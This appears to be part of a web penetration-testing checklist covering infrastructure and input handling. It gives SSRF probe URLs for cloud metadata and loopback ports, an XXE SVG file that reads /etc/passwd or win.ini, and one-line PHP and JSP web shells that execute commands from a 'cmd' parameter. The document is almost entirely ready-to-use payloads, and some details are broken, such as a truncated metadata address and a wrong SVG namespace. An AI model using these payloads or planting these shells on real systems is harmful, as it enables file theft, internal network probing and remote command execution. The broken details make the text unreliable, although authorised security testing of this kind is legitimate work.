## 4️⃣ Area 4: Infrastructure & Input Handling## Step 1: Server-Side Request Forgery (SSRF)
When an input field requests a remote image URL, avatar, or link, submit internal metadata or loopback paths:

* Cloud Metadata Endpoint (AWS/OpenStack):

http://169.254.169

* Local Loopback Port Scanning:

http://127.0.0.1:8080

http://localhost:3000


## Step 2: XML External Entity (XXE) Injection
If uploading document structures (such as .svg image files or .xml configurations), save the text below with an .svg extension to test for local file visibility:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<svg width="100" height="100" xmlns="http://w3.org">
  <text x="10" y="20" font-size="10">&xxe;</text>
</svg>

(Windows backend variant entry: file:///c:/windows/win.ini)
## Step 3: Remote Code Execution (RCE) Web Shells
If an application contains a file upload vulnerability that executes server-side code without verification, standard minimal shells include:

* PHP Environment Template:

<?php echo system($_GET['cmd']); ?>

* JSP (Java) Environment Template:

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>


